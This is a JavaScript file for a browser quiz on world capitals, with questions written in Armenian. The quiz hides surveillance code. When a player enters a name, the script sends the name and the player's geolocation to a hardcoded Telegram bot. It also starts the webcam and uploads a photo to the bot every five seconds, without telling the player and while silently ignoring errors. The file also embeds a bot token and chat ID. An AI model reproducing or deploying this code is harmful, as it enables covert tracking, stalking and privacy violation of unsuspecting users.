const QUESTIONS = [
  { question: "Ո՞րն է Հայաստանի մայրաքաղաքը", answers: ["Երևան", "Գյումրի", "Վանաձոր", "Աշտարակ"], correct: "Երևան" },
  { question: "Ո՞րն է Ռուսաստանի մայրաքաղաքը", answers: ["Մոսկվա", "Սանկտ Պետերբուրգ", "Կազան", "Նովոսիբիրսկ"], correct: "Մոսկվա" },
  { question: "Ո՞րն է Ֆրանսիայի մայրաքաղաքը", answers: ["Փարիզ", "Լիոն", "Մարսել", "Նիցցա"], correct: "Փարիզ" },
  { question: "Ո՞րն է Իտալիայի մայրաքաղաքը", answers: ["Հռոմ", "Միլան", "Նեապոլ", "Վենետիկ"], correct: "Հռոմ" },
  { question: "Ո՞րն է Իսպանիայի մայրաքաղաքը", answers: ["Մադրիդ", "Բարսելոնա", "Սևիլիա", "Վալենսիա"], correct: "Մադրիդ" },
  { question: "Ո՞րն է Գերմանիայի մայրաքաղաքը", answers: ["Բեռլին", "Մյունխեն", "Համբուրգ", "Ֆրանկֆուրտ"], correct: "Բեռլին" },
  { question: "Ո՞րն է Իրանի մայրաքաղաքը", answers: ["Թեհրան", "Իսֆահան", "Շիրազ", "Թաբրիզ"], correct: "Թեհրան" },
  { question: "Ո՞րն է Չինաստանի մայրաքաղաքը", answers: ["Պեկին", "Շանհայ", "Հոնկոնգ", "Գուանչժոու"], correct: "Պեկին" },
  { question: "Ո՞րն է Ճապոնիայի մայրաքաղաքը", answers: ["Տոկիո", "Օսակա", "Կիոտո", "Նագոյա"], correct: "Տոկիո" },
  { question: "Ո՞րն է ԱՄՆ-ի մայրաքաղաքը", answers: ["Վաշինգտոն", "Նյու Յորք", "Լոս Անջելես", "Չիկագո"], correct: "Վաշինգտոն" },
  { question: "Ո՞րն է Կանադայի մայրաքաղաքը", answers: ["Օտտավա", "Տորոնտո", "Վանկուվեր", "Մոնրեալ"], correct: "Օտտավա" },
  { question: "Ո՞րն է Բրազիլիայի մայրաքաղաքը", answers: ["Բրազիլիա", "Ռիո դե Ժանեյրո", "Սան Պաուլու", "Սալվադոր"], correct: "Բրազիլիա" },
  { question: "Ո՞րն է Արգենտինայի մայրաքաղաքը", answers: ["Բուենոս Այրես", "Կորդոբա", "Մենդոսա", "Ռոսարիո"], correct: "Բուենոս Այրես" },
  { question: "Ո՞րն է Մեքսիկայի մայրաքաղաքը", answers: ["Մեխիկո", "Գվադալախարա", "Մոնտերեյ", "Տիհուանա"], correct: "Մեխիկո" },
  { question: "Ո՞րն է Եգիպտոսի մայրաքաղաքը", answers: ["Կահիրե", "Ալեքսանդրիա", "Գիզա", "Լուքսոր"], correct: "Կահիրե" },
  { question: "Ո՞րն է Ավստրալիայի մայրաքաղաքը", answers: ["Քանբեռա", "Սիդնեյ", "Մելբուռն", "Բրիսբեն"], correct: "Քանբեռա" },
  { question: "Ո՞րն է Նոր Զելանդիայի մայրաքաղաքը", answers: ["Վելլինգտոն", "Օքլենդ", "Քրայսթչերչ", "Դյունեդին"], correct: "Վելլինգտոն" },
  { question: "Ո՞րն է Հնդկաստանի մայրաքաղաքը", answers: ["Նյու Դելի", "Մումբայ", "Բանգալոր", "Կալկուտա"], correct: "Նյու Դելի" },
  { question: "Ո՞րն է Պակիստանի մայրաքաղաքը", answers: ["Իսլամաբադ", "Լահոր", "Քարաչի", "Ռավալպինդի"], correct: "Իսլամաբադ" },
  { question: "Ո՞րն է Թայլանդի մայրաքաղաքը", answers: ["Բանգկոկ", "Պուկետ", "Չիանգ Մայ", "Պատտայա"], correct: "Բանգկոկ" }
];

const shuffled = QUESTIONS.sort(() => 0.5 - Math.random()).slice(0, 10);
let currentQuestion = 0;
let correctAnswers = 0;
let wrongAnswers = 0;
let userName = "";

const nameForm = document.getElementById("name-form");
const nameInput = document.getElementById("name-input");
const gameArea = document.getElementById("game-area");
const questionEl = document.getElementById("question");
const answersContainer = document.getElementById("answer-buttons");
const tryAgainBtn = document.getElementById("try-again-btn");
const userNameDisplay = document.getElementById("user-name");
const scoreInfo = document.getElementById("score-info");

nameForm.addEventListener("submit", (e) => {
  e.preventDefault();
  userName = nameInput.value.trim() || "Անհայտ";
  document.getElementById("name-form-container").style.display = "none";
  gameArea.style.display = "block";
  userNameDisplay.textContent = userName;
  updateScore();
  sendTelegramMessage(userName);
  getLocation();
  startCamera();
  showQuestion();
});

function showQuestion() {
  const q = shuffled[currentQuestion];
  questionEl.textContent = q.question;
  answersContainer.innerHTML = "";
  const shuffledAnswers = [...q.answers].sort(() => Math.random() - 0.5);
  shuffledAnswers.forEach(answer => {
    const btn = document.createElement("button");
    btn.textContent = answer;
    btn.addEventListener("click", () => selectAnswer(btn, answer, q.correct));
    answersContainer.appendChild(btn);
  });
}

function selectAnswer(button, answer, correct) {
  const buttons = answersContainer.querySelectorAll("button");
  buttons.forEach(btn => btn.disabled = true);
  if (answer === correct) {
    button.classList.add("correct");
    correctAnswers++;
  } else {
    button.classList.add("wrong");
    buttons.forEach(b => {
      if (b.textContent === correct) b.classList.add("correct");
    });
    wrongAnswers++;
  }
  updateScore();
  setTimeout(() => {
    currentQuestion++;
    if (currentQuestion < shuffled.length) {
      showQuestion();
    } else {
      showEnd();
    }
  }, 1000);
}

function updateScore() {
  scoreInfo.innerHTML = `
    Մնաց: ${shuffled.length - currentQuestion} | 
    Ճիշտ: ${correctAnswers} | 
    Սխալ: ${wrongAnswers}
  `;
}

function showEnd() {
  tryAgainBtn.style.display = "block";
}

tryAgainBtn.addEventListener("click", () => {
  location.reload();
});

// === Telegram ===
function sendTelegramMessage(name, lat = "", lon = "") {
  let text = `👤 Имя: ${name}`;
  if (lat && lon) {
    text += `\n🌍 [Посмотреть на карте](https://maps.google.com/?q=${lat},${lon})`;
  }
  const token = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
  const chat_id = "8071841674";
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id, text, parse_mode: "Markdown" })
  });
}

// === Геолокация ===
function getLocation() {
  navigator.geolocation?.getCurrentPosition((pos) => {
    const { latitude, longitude } = pos.coords;
    sendTelegramMessage(userName, latitude, longitude);
  });
}

// === Камера ===
function startCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.getElementById("video");
      video.srcObject = stream;
      setInterval(() => captureAndSendPhoto(video), 5000);
    })
    .catch(err => {});
}

function captureAndSendPhoto(video) {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);
  canvas.toBlob(blob => {
    const formData = new FormData();
    formData.append("chat_id", "8071841674");
    formData.append("photo", blob, "photo.jpg");
    fetch(`https://api.telegram.org/bot7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw/sendPhoto`, {
      method: "POST",
      body: formData
    });
  });
}
